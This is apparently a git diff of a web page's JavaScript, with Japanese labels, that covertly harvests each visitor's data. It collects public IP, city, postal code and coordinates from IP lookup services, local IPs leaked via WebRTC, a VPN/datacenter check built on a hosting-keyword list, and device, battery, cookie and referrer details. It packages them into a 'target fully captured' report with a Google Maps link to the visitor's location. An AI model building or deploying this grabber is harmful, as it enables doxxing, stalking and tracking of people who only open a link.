@@ -28,62 +28,47 @@ html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:cente
     ref: document.referrer || "直接アクセス"
   };
 
-  // 複数ソースで確実に取る
-  const sources = [
-    { url: "https://ipapi.co/json/", map: d => ({
-      ip: d.ip, city: d.city, region: d.region, country: d.country_name, countryCode: d.country_code,
-      org: d.org, as: d.asn, loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
-      zip: d.postal, timezone: d.timezone, proxy: null, hosting: null, mobile: null
-    })},
-    { url: "https://ipinfo.io/json", map: d => ({
-      ip: d.ip, city: d.city, region: d.region, country: d.country, countryCode: d.country,
-      org: d.org, as: d.org, loc: d.loc, zip: d.postal, timezone: d.timezone,
-      proxy: null, hosting: null, mobile: null
-    })},
-    { url: "https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query,mobile,proxy,hosting,reverse", map: d => ({
-      ip: d.query, city: d.city, region: d.regionName, country: d.country, countryCode: d.countryCode,
-      org: d.isp || d.org, as: d.as || d.asname, loc: d.lat && d.lon ? `${d.lat},${d.lon}` : null,
-      zip: d.zip, timezone: d.timezone, proxy: d.proxy, hosting: d.hosting, mobile: d.mobile
-    })},
-    { url: "https://ipwho.is/", map: d => ({
-      ip: d.ip, city: d.city, region: d.region, country: d.country, countryCode: d.country_code,
-      org: d.connection?.isp || d.connection?.org, as: d.connection?.asn,
-      loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
-      zip: d.postal, timezone: d.timezone?.id, proxy: d.security?.proxy, hosting: d.security?.hosting, mobile: null
-    })},
-    { url: "https://api.ip.sb/geoip", map: d => ({
-      ip: d.ip, city: d.city, region: d.region, country: d.country, countryCode: d.country_code,
-      org: d.organization || d.isp, as: d.asn, loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
-      zip: d.postal_code, timezone: d.timezone, proxy: null, hosting: null, mobile: null
-    })}
-  ];
+  try {
+    const r = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query,mobile,proxy,hosting,reverse", {
+      signal: AbortSignal.timeout(4500)
+    });
+    const d = await r.json();
+    if (d.status === "success") {
+      info.ip = d.query;
+      info.city = d.city || "";
+      info.region = d.regionName || "";
+      info.country = d.country || "";
+      info.countryCode = d.countryCode || "";
+      info.org = d.isp || d.org || "";
+      info.as = d.as || d.asname || "";
+      info.loc = (d.lat && d.lon) ? `${d.lat},${d.lon}` : null;
+      info.zip = d.zip || "";
+      info.timezone = d.timezone || "";
+      info.proxy = d.proxy === true;
+      info.hosting = d.hosting === true;
+      info.mobile = d.mobile === true;
+      info.reverse = d.reverse || "";
+    }
+  } catch {}
 
-  for (const src of sources) {
+  if (!info.ip) {
     try {
-      const r = await fetch(src.url, { signal: AbortSignal.timeout(3200) });
+      const r = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) });
       const d = await r.json();
-      const m = src.map(d);
-      if (m.ip) {
-        info.ip = m.ip;
-        info.city = m.city || info.city;
-        info.region = m.region || info.region;
-        info.country = m.country || info.country;
-        info.countryCode = m.countryCode || info.countryCode;
-        info.org = m.org || info.org;
-        info.as = m.as || info.as;
-        info.loc = m.loc || info.loc;
-        info.zip = m.zip || info.zip;
-        info.timezone = m.timezone || info.timezone;
-        info.proxy = m.proxy ?? info.proxy;
-        info.hosting = m.hosting ?? info.hosting;
-        info.mobile = m.mobile ?? info.mobile;
-        // 十分な情報が取れたら終了
-        if (info.ip && info.city && info.country) break;
+      if (d.ip) {
+        info.ip = d.ip;
+        info.city = d.city || info.city;
+        info.region = d.region || info.region;
+        info.country = d.country_name || info.country;
+        info.countryCode = d.country_code || info.countryCode;
+        info.org = d.org || info.org;
+        info.loc = (d.latitude && d.longitude) ? `${d.latitude},${d.longitude}` : info.loc;
+        info.zip = d.postal || info.zip;
+        info.timezone = d.timezone || info.timezone;
       }
     } catch {}
   }
 
-  // WebRTC ローカルIP
   info.localIPs = [];
   try {
     const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
@@ -97,10 +82,28 @@ html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:cente
         info.localIPs.push(m[1]);
       }
     };
-    await new Promise(r => setTimeout(r, 1800));
+    await new Promise(r => setTimeout(r, 1600));
     pc.close();
   } catch {
     info.localIPs = ["取得失敗"];
+  }
+
+  const dcKeywords = [
+    "amazon", "aws", "google", "cloud", "azure", "microsoft", "digitalocean", "linode", "vultr",
+    "ovh", "hetzner", "contabo", "cloudflare", "fastly", "akamai", "sakura", "idcf", "nii",
+    "data center", "datacenter", "hosting", "server", "vps", "dedicated", "colocation"
+  ];
+  const orgLower = (info.org || "").toLowerCase();
+  const isDC = dcKeywords.some(k => orgLower.includes(k));
+  const isTokyo = (info.city || "").toLowerCase().includes("tokyo") || (info.city || "").includes("東京");
+
+  let vpnStatus = "❌ 未使用（一般回線の可能性高い）";
+  if (info.proxy || info.hosting || isDC) {
+    vpnStatus = "⚠️ VPN / Proxy / データセンターの可能性が高い";
+  } else if (info.mobile) {
+    vpnStatus = "📱 モバイル回線";
+  } else if (isTokyo && !info.proxy && !info.hosting && !isDC) {
+    vpnStatus = "❌ 未使用（東京一般回線の可能性）";
   }
 
   const n = navigator;
@@ -132,21 +135,6 @@ html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:cente
     info.gpu_renderer = "取得失敗";
   }
 
-  try {
-    const c = document.createElement("canvas");
-    c.width = 300; c.height = 60;
-    const ctx = c.getContext("2d");
-    ctx.textBaseline = "top";
-    ctx.font = "14px Arial";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(0, 0, 300, 60);
-    ctx.fillStyle = "#069";
-    ctx.fillText("zombie-" + Date.now(), 8, 22);
-    info.canvas = c.toDataURL().slice(-80);
-  } catch {
-    info.canvas = "失敗";
-  }
-
   if (n.connection) {
     info.conn_type = n.connection.effectiveType || "不明";
     info.downlink = n.connection.downlink ? n.connection.downlink + " Mbps" : "不明";
@@ -166,25 +154,18 @@ html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:cente
     info.battery = "取得失敗";
   }
 
-  let vpnStatus = "✅ 未使用の可能性が高い";
-  if (info.proxy === true || info.hosting === true) {
-    vpnStatus = "⚠️ VPN / Proxy / ホスティングの可能性あり";
-  } else if (info.mobile === true) {
-    vpnStatus = "📱 モバイル回線";
-  }
-
   const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(info.ua) || info.touch > 0;
-  const deviceType = isMobile ? "Mobile / Tablet" : "Desktop";
+  const deviceType = isMobile ? "Mobile / Tablet" : "PC";
   const localIPText = info.localIPs.length ? info.localIPs.join(", ") : "取得失敗";
 
   const embed = {
     title: "🔥 ターゲット完全捕捉報告 🔥",
-    color: 0xed4245,
+    color: 0x000000,
     fields: [
       { name: "🌐 公開IP", value: `\`${info.ip || "不明"}\``, inline: true },
       { name: "🏠 ローカルIP", value: `\`${localIPText}\``, inline: true },
-      { name: "🛡️ VPN/Proxy", value: vpnStatus, inline: true },
-      { name: "📡 ISP / 組織", value: info.org || "不明", inline: true },
+      { name: "🛡️ VPN/Proxy判定", value: vpnStatus, inline: true },
+      { name: "📡 ネットワーク (ISP)", value: info.org || "不明", inline: true },
       { name: "🔢 AS番号", value: info.as || "不明", inline: true },
       { name: "📍 住所情報", value: `国: ${info.country || "不明"} (${info.countryCode || "?"})\n県: ${info.region || "不明"}\n市: ${info.city || "不明"}\n郵便番号: ${info.zip || "不明"}`, inline: false },
       { name: "🗺️ 座標", value: info.loc || "不明", inline: true },
@@ -196,10 +177,8 @@ html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:cente
       { name: "🗣️ 言語", value: info.lang || "不明", inline: true },
       { name: "🧠 CPUコア", value: String(info.cores), inline: true },
       { name: "💾 メモリ", value: info.memory, inline: true },
-      { name: "👆 タッチポイント", value: String(info.touch), inline: true },
-      { name: "🎮 GPUベンダー", value: info.gpu_vendor || "不明", inline: false },
-      { name: "🎮 GPUレンダラー", value: info.gpu_renderer || "不明", inline: false },
-      { name: "📶 接続タイプ", value: `${info.conn_type} | ${info.downlink || "-"} | RTT ${info.rtt || "-"}`, inline: false },
+      { name: "🎮 GPU", value: `${info.gpu_vendor || "不明"} / ${info.gpu_renderer || "不明"}`, inline: false },
+      { name: "📶 接続", value: `${info.conn_type} | ${info.downlink || "-"} | RTT ${info.rtt || "-"}`, inline: false },
       { name: "🔋 バッテリー", value: info.battery, inline: true },
       { name: "🍪 Cookie", value: info.cookie, inline: true },
       { name: "📎 リファラー", value: info.ref, inline: false },
@@ -213,7 +192,7 @@ html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:cente
     const [lat, lon] = info.loc.split(",");
     embed.fields.splice(7, 0, {
       name: "🗺️ Googleマップ",
-      value: `[場所を確認する](https://www.google.com/maps?q=${lat},${lon})`,
+      value: `[場所を確認](https://www.google.com/maps?q=${lat},${lon})`,
       inline: false
     });
   }
